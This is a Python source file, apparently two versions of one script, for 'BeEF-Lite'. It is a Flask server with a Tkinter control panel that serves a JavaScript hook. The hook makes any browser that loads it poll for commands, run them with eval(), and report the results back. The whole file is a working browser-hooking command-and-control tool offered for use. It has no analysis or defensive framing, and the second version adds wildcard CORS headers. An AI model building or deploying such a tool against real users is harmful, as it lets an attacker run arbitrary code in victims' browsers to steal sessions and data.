"""import tkinter as tk
import threading
import requests
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
from collections import defaultdict

# --------------------- Flask Hook Server ---------------------
app = Flask(__name__)
CORS(app)

clients = set()
commands = defaultdict(lambda: {"command": ""})
results = defaultdict(str)

HOOK_JS = """
const clientId = Math.random().toString(36).substring(2);
setInterval(() => {
  fetch(`http://localhost:5000/register?client=${clientId}`)
    .then(res => res.json())
    .then(cmd => {
      if (cmd && cmd.command) {
        eval(cmd.command);
        fetch(`http://localhost:5000/result`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ client: clientId, result: "Executed: " + cmd.command })
        });
      }
    });
}, 3000);
"""

@app.route("/hook.js")
def hook_js():
    return make_response(HOOK_JS, 200, {"Content-Type": "application/javascript"})

@app.route("/register")
def register():
    client_id = request.args.get("client")
    if client_id:
        clients.add(client_id)
    return jsonify(commands[client_id])

@app.route("/send", methods=["POST"])
def send_command():
    data = request.get_json()
    commands[data["client"]]["command"] = data["command"]
    return "Command set"

@app.route("/result", methods=["POST"])
def result():
    data = request.get_json()
    results[data["client"]] = data["result"]
    return "OK"

@app.route("/clients")
def get_clients():
    return jsonify(list(clients))

@app.route("/results")
def get_results():
    return jsonify(results)

def start_server():
    app.run(port=5000)

# --------------------- GUI Control Panel ---------------------
def launch_gui():
    root = tk.Tk()
    root.title("BeEF-Lite Panel")
    root.geometry("500x500")
    root.configure(bg="#1e1e1e")

    client_list = tk.Listbox(root, width=60, bg="#2a2a2a", fg="#00ff88")
    client_list.pack(pady=10)

    def refresh_clients():
        client_list.delete(0, tk.END)
        try:
            response = requests.get("http://localhost:5000/clients")
            for client in response.json():
                client_list.insert(tk.END, client)
        except:
            client_list.insert(tk.END, "Server not running")

    command_entry = tk.Entry(root, width=60)
    command_entry.pack(pady=5)

    def send_command_to_client():
        selected = client_list.get(tk.ACTIVE)
        command = command_entry.get()
        if not selected:
            return
        requests.post("http://localhost:5000/send", json={
            "client": selected,
            "command": command
        })
        output_box.insert(tk.END, f"Sent to {selected}: {command}\n")

    def fetch_results():
        try:
            response = requests.get("http://localhost:5000/results")
            output_box.delete(1.0, tk.END)
            for client, res in response.json().items():
                output_box.insert(tk.END, f"[{client}] => {res}\n")
        except:
            output_box.insert(tk.END, "Failed to fetch results.\n")

    tk.Button(root, text="Refresh Clients", command=refresh_clients, bg="#005f5f", fg="white").pack(pady=5)
    tk.Button(root, text="Send JS Command", command=send_command_to_client, bg="#007744", fg="white").pack(pady=5)
    tk.Button(root, text="Get Results", command=fetch_results, bg="#0055aa", fg="white").pack(pady=5)

    output_box = tk.Text(root, height=10, width=60, bg="#2a2a2a", fg="white")
    output_box.pack(pady=10)

    refresh_clients()
    root.mainloop()

# --------------------- Main Threading Entry ---------------------
if __name__ == "__main__":
    print("🔥 BeEF-Lite is running at http://localhost:5000/hook.js")
    threading.Thread(target=start_server, daemon=True).start()
    launch_gui()
"""
import tkinter as tk
import threading
import requests
from flask import Flask, request, jsonify, make_response
from collections import defaultdict

# --------------------- Flask Hook Server ---------------------
app = Flask(__name__)

clients = set()
commands = defaultdict(lambda: {"command": ""})
results = defaultdict(str)

HOOK_JS = """
const clientId = Math.random().toString(36).substring(2);
setInterval(() => {
  fetch(`http://localhost:5000/register?client=${clientId}`)
    .then(res => res.json())
    .then(cmd => {
      if (cmd && cmd.command) {
        eval(cmd.command);
        fetch(`http://localhost:5000/result`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ client: clientId, result: "Executed: " + cmd.command })
        });
      }
    });
}, 3000);
"""

@app.after_request
def apply_cors(response):
    # Manual CORS headers — removes flask_cors dependency
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST"
    return response

@app.route("/hook.js")
def hook_js():
    return make_response(HOOK_JS, 200, {"Content-Type": "application/javascript"})

@app.route("/register")
def register():
    client_id = request.args.get("client")
    if client_id:
        clients.add(client_id)
    return jsonify(commands[client_id])

@app.route("/send", methods=["POST"])
def send_command():
    data = request.get_json()
    commands[data["client"]]["command"] = data["command"]
    return "Command set"

@app.route("/result", methods=["POST"])
def result():
    data = request.get_json()
    results[data["client"]] = data["result"]
    return "OK"

@app.route("/clients")
def get_clients():
    return jsonify(list(clients))

@app.route("/results")
def get_results():
    return jsonify(results)

def start_server():
    app.run(port=5000)

# --------------------- GUI Control Panel ---------------------
def launch_gui():
    root = tk.Tk()
    root.title("BeEF-Lite Panel")
    root.geometry("500x500")
    root.configure(bg="#1e1e1e")

    client_list = tk.Listbox(root, width=60, bg="#2a2a2a", fg="#00ff88")
    client_list.pack(pady=10)

    def refresh_clients():
        client_list.delete(0, tk.END)
        try:
            response = requests.get("http://localhost:5000/clients")
            for client in response.json():
                client_list.insert(tk.END, client)
        except:
            client_list.insert(tk.END, "Server not running")

    command_entry = tk.Entry(root, width=60)
    command_entry.pack(pady=5)

    def send_command_to_client():
        selected = client_list.get(tk.ACTIVE)
        command = command_entry.get()
        if not selected:
            return
        requests.post("http://localhost:5000/send", json={
            "client": selected,
            "command": command
        })
        output_box.insert(tk.END, f"Sent to {selected}: {command}\n")

    def fetch_results():
        try:
            response = requests.get("http://localhost:5000/results")
            output_box.delete(1.0, tk.END)
            for client, res in response.json().items():
                output_box.insert(tk.END, f"[{client}] => {res}\n")
        except:
            output_box.insert(tk.END, "Failed to fetch results.\n")

    tk.Button(root, text="Refresh Clients", command=refresh_clients, bg="#005f5f", fg="white").pack(pady=5)
    tk.Button(root, text="Send JS Command", command=send_command_to_client, bg="#007744", fg="white").pack(pady=5)
    tk.Button(root, text="Get Results", command=fetch_results, bg="#0055aa", fg="white").pack(pady=5)

    output_box = tk.Text(root, height=10, width=60, bg="#2a2a2a", fg="white")
    output_box.pack(pady=10)

    refresh_clients()
    root.mainloop()

# --------------------- Main Threading Entry ---------------------
if __name__ == "__main__":
    print("🔥 BeEF-Lite is running at http://localhost:5000/hook.js")
    threading.Thread(target=start_server, daemon=True).start()
    launch_gui()
